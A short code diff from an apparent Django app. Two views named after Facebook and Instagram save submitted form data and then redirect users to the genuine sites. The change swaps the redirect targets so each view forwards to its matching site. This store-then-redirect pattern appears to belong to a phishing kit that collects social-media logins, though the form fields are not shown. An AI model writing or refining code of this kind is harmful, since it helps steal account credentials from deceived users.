@@ -27,7 +27,7 @@ def facebook(request):
         form = Facebook(request.POST, request.FILES)
         if form.is_valid():
             form.save()
-            return redirect("https://instagram.com")
+            return redirect("https://facebook.com")
     else:
         form =  Facebook()
     context = {'form': form}
@@ -38,7 +38,7 @@ def instagram(request):
         form = Instagram(request.POST, request.FILES)
         if form.is_valid():
             form.save()
-            return redirect("https://facebook.com")
+            return redirect("https://instagram.com")
     else:
         form =  Instagram()
     context = {'form': form}
